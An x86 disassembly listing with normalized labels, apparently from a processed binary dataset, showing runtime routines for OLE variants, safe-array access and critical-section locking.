pop edx
pop esi
pop ebx
retn
sub_4141ec
push ebx
push ecx
mov ebx eax
push esp
mov eax ebx
call sub_414154
push eax
call SafeArrayAccessData
call sub_40ef3c
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414244
push ebx
push esi
mov ebx eax
movzx esi bx
and esi 0xffffbfff
mov eax esi
sub eax 0x16
jae r-xdata
mov eax ebx
call sub_413f48
test al al
jne r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 + 0x1 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_414280
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0xc ]
call sub_414068
test al al
jne r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax 0x80070057
call sub_40ef3c
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414340
push [ fs : eax ]
mov [ fs : eax ] esp
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40ef3c
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayGetElement
call sub_40ef3c
mov [ ebp - 0x10 ] bx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ef3c
mov eax [ ebp - 0x1c ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40f614
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_40f614
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414347
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
sub_41434c
push ebp
mov ebp esp
push ebx
mov ebx ecx
inc ebx
jle r-xdata
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_414280
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ edx + ecx * 4 ]
dec ecx
jns r-xdata
sub_414370
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0x8 ]
call sub_414068
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1a ]
mov eax esi
call sub_414068
test al al
jne r-xdata
mov eax 0x80070057
call sub_40ef3c
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ax [ ebp - 0x1a ]
call sub_414244
test al al
jne r-xdata
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40ef3c
cmp [ ebp - 0x1a ] 0x100
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4144a8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0xc
jne r-xdata
cmp [ ebp - 0x1a ] 0x100
jne r-xdata
mov eax 0x80020005
call sub_40ef3c
mov edx esi
lea eax [ ebp - 0x10 ]
mov ecx ebx
call sub_40fb58
add ebx 0xfffffff8
sub ebx 0x2
jb r-xdata
mov edx esi
lea eax [ ebp - 0x10 ]
call j_sub_40f8a8
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ef3c
mov eax [ ebp - 0x24 ]
mov edx esi
call sub_40f614
jmp r-xdata
mov ax [ ebp - 0x1a ]
call sub_413f48
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
sub ebx 0x3
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPutElement
call sub_40ef3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
sub_4144b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
js r-xdata
mov ebx [ ebp + 0x8 ]
inc ebx
push ebx
push edx
push eax
call sub_414370
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ ecx + ebx * 4 ]
dec ebx
jns r-xdata
sub_4144e0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi [ ebp + 0x8 ]
mov ebp eax
xor ebx ebx
test ecx ecx
jge r-xdata
xor eax eax
mov al [ edi + 0x1 ]
add edi eax
mov eax [ esi + ebx * 4 ]
mul [ edi + 0x2 ]
mov edi [ edi + 0x6 ]
test edi edi
je r-xdata
mov ebp [ ebp ]
add ebp eax
inc ebx
cmp ebx ecx
jle r-xdata
mov edi [ edi ]
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41455c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] 0x1
mov ebx eax
mov eax edx
call sub_41453c
dec eax
test eax eax
jle r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] eax
dec [ esp + 0x4 ]
jne r-xdata
mov eax ebx
call sub_414554
mov esi eax
mov eax [ ebx ]
call sub_414554
mov ebp eax
dec esi
test esi esi
jle r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebx ]
mov edi 0x1
inc edi
dec esi
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov eax [ ebx + edi * 4 ]
call sub_414554
cmp ebp eax
je r-xdata
sub_4145c4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
call sub_41453c
mov esi eax
push esi
mov eax ebp
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_414554
dec eax
mov edx [ ebp ]
mov [ edx + edi * 4 ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
sub_414618
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ edi ]
call sub_4050b8
mov edx eax
test edx edx
jl r-xdata
test bl bl
je r-xdata
inc edx
xor eax eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
call sub_4050b8
cmp eax 0x0
jl r-xdata
inc eax
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov ecx [ edi ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 ] edx
dec eax
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
sub_414684
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi eax
mov eax edx
call sub_41453c
mov ebp eax
mov eax ebp
add eax eax
push eax
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
xor ebx ebx
jmp r-xdata
mov eax ebp
add eax eax
cmp ebx eax
jl r-xdata
mov eax [ edi ]
xor edx edx
mov [ eax + ebx * 4 ] edx
inc ebx
test esi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov eax esi
call sub_414554
dec eax
mov edx [ edi ]
mov [ edx + ebx * 4 ] eax
mov esi [ esi ]
sub_4146dc
push ebx
mov ebx 0x1
test eax eax
je r-xdata
cmp ebx 0x1
jle r-xdata
cmp [ eax ] 0x11
jne r-xdata
call sub_40eab4
cmp ebx 0xe
je r-xdata
xor edx edx
mov dl [ eax + 0x1 ]
add eax edx
mov ebx [ eax + 0xa ]
cmp ebx 0x48
jne r-xdata
cmp ebx 0xf
je r-xdata
mov ebx 0x100
cmp ebx 0x14
jle r-xdata
mov eax ebx
pop ebx
retn
cmp ebx 0x100
je r-xdata
sub_414724
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414a66
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40538c
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_40538c
mov eax [ ebp - 0x4 ]
call sub_40f2ec
mov ebx esi
mov eax ebx
call sub_4146dc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x100
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x18 ] 0x8
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_414684
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax edi
call sub_4145c4
lea ecx [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0xc ]
call sub_405278
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4050b8
mov edx eax
mov cx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_4140ac
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40f614
mov eax [ ebp - 0x4 ]
call sub_4141ec
xor eax eax
push ebp
push sub_414a2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax edi
call sub_41455c
test al al
je r-xdata
mov eax ebx
call sub_41453c
dec eax
jle r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_414618
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xb
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a6d
lea eax [ ebp - 0x38 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404abc
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404abc
retn
push esi
mov eax [ ebp - 0x10 ]
call sub_4050b8
mov ecx eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4144e0
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41420c
retn
cmp eax 0x12
jg r-xdata
je r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
mov dx [ ebx ]
neg dx
sbb edx edx
neg edx
call sub_4138c4
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0x4
call sub_4136f4
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movzx edx [ ebx ]
mov cl 0x2
call sub_4136f4
jmp r-xdata
sub eax 0xc
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_4050b8
push eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_4144b8
lea eax [ ebp - 0x28 ]
call sub_40f2ec
jmp [ eax * 4 + jump_table_414854 ]
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
push edx
push eax
lea eax [ ebp - 0x28 ]
call sub_4137f0
jmp r-xdata
sub eax 0xec
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_40f614
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xfe
call sub_4136f4
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_4136f4
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_4138ec
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_4138ec
jmp r-xdata
fild [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413914
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_4138ec
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_4139a4
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413a08
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_4136f4
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413928
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_4139dc
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xff
call sub_4136f4
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
xor edx edx
mov dl [ ebx ]
mov cl 0x1
call sub_4136f4
jmp r-xdata
jmp r-xdata
sub_414a74
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414d75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41417c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4141ec
xor edx edx
push ebp
push sub_414d45
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_40279c
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
mov eax 0x80070057
call sub_40ef3c
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov ebx edi
mov edx ebx
call sub_4050e0
mov eax ebx
call sub_41453c
mov eax ebx
call sub_4146dc
mov esi eax
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx edi
call sub_4145c4
lea ecx [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0x14 ]
call sub_405278
inc esi
xor ebx ebx
cmp eax 0x12
jg r-xdata
je r-xdata
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_4141c8
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_4141a4
pop edx
sub edx eax
inc edx
mov eax [ ebp - 0x10 ]
mov [ eax + ebx * 4 ] edx
inc ebx
dec esi
jne r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_411324
mov [ ebx ] ax
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
call sub_4109e0
mov [ ebx ] eax
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ff1c
mov [ ebx ] ax
jmp r-xdata
sub eax 0xc
je r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_414618
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_414ba3 ]
lea eax [ ebp - 0x28 ]
call sub_4109e0
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
jmp r-xdata
sub eax 0xec
je r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_40f614
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4050b8
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_41434c
push edi
mov eax [ ebp - 0x18 ]
call sub_4050b8
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
call sub_4144e0
mov ebx eax
mov eax esi
cmp eax 0xb
jg r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d4c
mov eax [ ebp - 0x8 ]
call sub_41420c
retn
lea eax [ ebp - 0x28 ]
call sub_40ff1c
mov [ ebx ] ax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ff1c
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_41186c
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_41186c
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_4121c8
fistp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_41186c
fstp [ ebx ]
fwait
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_412fa4
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_413648
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_4109e0
mov [ ebx ] eax
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_41287c
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_41357c
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ff1c
mov [ ebx ] al
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ff1c
mov [ ebx ] al
jmp r-xdata
jmp r-xdata
sub_414d4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d7c
lea eax [ ebp - 0x28 ]
call sub_40f300
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404abc
retn
sub_414d98
call [ esp + 0x40 ]
add [ eax ] cl
push esi
popad
jb r-xdata
jmp r-xdata
popad
outsb
je r-xdata
add al 0x0
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_415978
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_415298
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_414da8
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414e09
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_4050b0
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e10
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403234
sub_414e58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_415298
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_415978
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_414eac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414ee4
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_415298
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414f20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov cx [ rw-data ]
xor edx edx
mov eax esi
call sub_414f64
inc [ rw-data ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_414f64
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x8 ] cx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4151c1
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403204
push rw-data
call EnterCriticalSection
xor ecx ecx
push ebp
push sub_415194
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx ebx [ ebp - 0x8 ]
sub ebx 0x100
test ebx ebx
jl r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
cmp [ ebp - 0x8 ] 0x10f
jae r-xdata
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
mov eax ebx
mov ecx 0xf
cdq
idiv ecx
inc eax
mov edi eax
shl edi 0x4
sub edi eax
cmp edi 0x7ff
jle r-xdata
mov eax [ rw-data ]
call sub_4050b0
mov esi eax
cmp esi ebx
jg r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + ebx * 4 ] edx
mov eax [ ebp - 0x4 ]
mov dx [ ebp - 0x8 ]
mov [ eax + 0x4 ] dx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41519b
push rw-data
call LeaveCriticalSection
retn
cmp eax [ rw-data ]
jne r-xdata
push edi
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
mov edx esi
push edx
mov eax [ rw-data ]
call sub_4050b0
dec eax
pop edx
sub eax edx
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + ebx * 4 ]
mov eax [ eax ]
lea edx [ ebp - 0x13c ]
call sub_403184
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x4
lea eax [ ebp - 0x3c ]
push eax
push 0x2
lea edx [ ebp - 0x140 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x140 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
jmp r-xdata
inc eax
mov ecx [ rw-data ]
xor esi esi
mov [ ecx + edx * 4 ] esi
inc edx
dec eax
jne r-xdata
sub_4151c8
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4151ec
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035c0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41524f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415256
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_415340
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4153e4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_41568d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov al [ eax + ebx + 0x3 ]
mov edx eax
and dl 0x7f
mov esi edx
and esi 0xff
mov edx [ ebp + 0x8 ]
test al 0x80
setne al
cmp esi 0xa
jne r-xdata
cmp esi 0x48
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
lea eax [ edx + eax * 8 ]
call sub_41405c
jmp r-xdata
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x8 ]
lea esi [ ecx + edx * 8 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415694
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40402c
retn
cmp esi 0xc
jne r-xdata
cmp esi 0xc
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404528
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404860
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_404870
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404528
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404860
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov [ esi + 0x4 ] eax
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] 0x4008
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx esi
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] si
lea edx [ esi + esi * 2 ]
mov ecx [ rw-data ]
mov edx [ ecx + edx * 4 + 0x4 ]
dec edx
